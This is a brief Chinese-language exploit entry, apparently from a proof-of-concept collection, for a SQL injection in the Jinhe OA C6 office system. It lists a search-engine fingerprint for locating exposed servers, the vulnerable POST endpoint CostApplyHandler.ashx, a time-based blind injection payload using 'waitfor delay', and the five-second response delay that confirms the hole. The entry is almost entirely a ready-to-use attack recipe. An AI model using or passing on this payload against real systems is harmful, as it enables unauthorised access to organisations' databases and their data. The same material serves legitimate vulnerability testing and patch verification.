# 金和OAC6CostApplyHandler存在SQL注入漏洞

金和OA ｜ SQL注入 ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`POST /c6/JHSoft.Web.CostControl/BudgetExecution/Handlers/CostApplyHandler.ashx HTTP/1.1`

**Payload**
```
action=YeahChange&yeah=1'waitfor+delay+'0:0:5'--+
```
- **响应特征**：200 响应时间≥5S